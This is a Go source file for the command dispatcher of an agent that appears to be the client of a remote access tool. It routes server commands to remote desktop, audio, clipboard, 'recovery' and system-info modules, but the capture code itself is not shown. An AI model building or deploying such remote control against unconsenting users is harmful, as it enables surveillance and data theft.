package agent

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
	"github.com/rootbay/tenvy-client/internal/protocol"
)

type moduleRuntime struct {
	AgentID      string
	BaseURL      string
	AuthKey      string
	HTTPClient   *http.Client
	Logger       *log.Logger
	UserAgent    string
	Provider     systeminfo.AgentInfoProvider
	BuildVersion string
}

type module interface {
	Name() string
	Commands() []string
	Update(moduleRuntime) error
	HandleCommand(context.Context, protocol.Command) protocol.CommandResult
	Shutdown(context.Context)
}

type moduleEntry struct {
	module   module
	commands []string
}

type moduleRegistry struct {
	mu        sync.RWMutex
	modules   map[string]*moduleEntry
	lifecycle []*moduleEntry
}

func newDefaultModuleRegistry() *moduleRegistry {
	registry := newModuleRegistry()
	registry.register(&remoteDesktopModule{})
	registry.register(&audioModule{})
	registry.register(&clipboardModule{})
	registry.register(&recoveryModule{})
	registry.register(&systemInfoModule{})
	return registry
}

func newModuleRegistry() *moduleRegistry {
	return &moduleRegistry{
		modules:   make(map[string]*moduleEntry),
		lifecycle: make([]*moduleEntry, 0, 6),
	}
}

func (r *moduleRegistry) register(m module) {
	entry := &moduleEntry{
		module:   m,
		commands: append([]string(nil), m.Commands()...),
	}
	r.lifecycle = append(r.lifecycle, entry)
	for _, command := range entry.commands {
		if strings.TrimSpace(command) == "" {
			continue
		}
		r.modules[command] = entry
	}
}

func (r *moduleRegistry) Update(runtime moduleRuntime) error {
	r.mu.Lock()
	defer r.mu.Unlock()

	var errs []error
	for _, entry := range r.lifecycle {
		if err := entry.module.Update(runtime); err != nil {
			errs = append(errs, fmt.Errorf("%s: %w", entry.module.Name(), err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleRegistry) HandleCommand(ctx context.Context, cmd protocol.Command) (bool, protocol.CommandResult) {
	r.mu.RLock()
	entry, ok := r.modules[cmd.Name]
	r.mu.RUnlock()
	if !ok {
		return false, protocol.CommandResult{}
	}
	return true, entry.module.HandleCommand(ctx, cmd)
}

func (r *moduleRegistry) Shutdown(ctx context.Context) {
	r.mu.RLock()
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.RUnlock()

	for index := len(entries) - 1; index >= 0; index-- {
		entries[index].module.Shutdown(ctx)
	}
}

func (a *Agent) moduleRuntime() moduleRuntime {
	return moduleRuntime{
		AgentID:      a.id,
		BaseURL:      a.baseURL,
		AuthKey:      a.key,
		HTTPClient:   a.client,
		Logger:       a.logger,
		UserAgent:    a.userAgent(),
		Provider:     a,
		BuildVersion: a.buildVersion,
	}
}

type remoteDesktopModule struct {
	streamer *remotedesktop.RemoteDesktopStreamer
}

func (m *remoteDesktopModule) Name() string { return "remote-desktop" }

func (m *remoteDesktopModule) Commands() []string { return []string{"remote-desktop"} }

func (m *remoteDesktopModule) Update(runtime moduleRuntime) error {
	cfg := remotedesktop.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.streamer == nil {
		m.streamer = remotedesktop.NewRemoteDesktopStreamer(cfg)
		return nil
	}
	m.streamer.UpdateConfig(cfg)
	return nil
}

func (m *remoteDesktopModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.streamer == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "remote desktop subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.streamer.HandleCommand(ctx, cmd)
}

func (m *remoteDesktopModule) Shutdown(context.Context) {
	if m.streamer != nil {
		m.streamer.Shutdown()
	}
}

type audioModule struct {
	bridge *audioctrl.AudioBridge
}

func (m *audioModule) Name() string { return "audio-control" }

func (m *audioModule) Commands() []string { return []string{"audio-control"} }

func (m *audioModule) Update(runtime moduleRuntime) error {
	cfg := audioctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.bridge == nil {
		m.bridge = audioctrl.NewAudioBridge(cfg)
		return nil
	}
	m.bridge.UpdateConfig(cfg)
	return nil
}

func (m *audioModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.bridge == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "audio subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.bridge.HandleCommand(ctx, cmd)
}

func (m *audioModule) Shutdown(context.Context) {
	if m.bridge != nil {
		m.bridge.Shutdown()
	}
}

type clipboardModule struct {
	manager *clipboard.Manager
}

func (m *clipboardModule) Name() string { return "clipboard" }

func (m *clipboardModule) Commands() []string { return []string{"clipboard"} }

func (m *clipboardModule) Update(runtime moduleRuntime) error {
	cfg := clipboard.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = clipboard.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *clipboardModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "clipboard subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *clipboardModule) Shutdown(context.Context) {
	if m.manager != nil {
		m.manager.Shutdown()
	}
}

type recoveryModule struct {
	manager *recovery.Manager
}

func (m *recoveryModule) Name() string { return "recovery" }

func (m *recoveryModule) Commands() []string { return []string{"recovery"} }

func (m *recoveryModule) Update(runtime moduleRuntime) error {
	cfg := recovery.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = recovery.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *recoveryModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "recovery subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *recoveryModule) Shutdown(context.Context) {
	if m.manager != nil {
		m.manager.Shutdown()
	}
}

type systemInfoModule struct {
	collector *systeminfo.Collector
}

func (m *systemInfoModule) Name() string { return "system-info" }

func (m *systemInfoModule) Commands() []string { return []string{"system-info"} }

func (m *systemInfoModule) Update(runtime moduleRuntime) error {
	if runtime.Provider == nil {
		return fmt.Errorf("missing agent provider")
	}
	m.collector = systeminfo.NewCollector(runtime.Provider, runtime.BuildVersion)
	return nil
}

func (m *systemInfoModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.collector == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "system information subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.collector.HandleCommand(ctx, cmd)
}

func (m *systemInfoModule) Shutdown(context.Context) {}
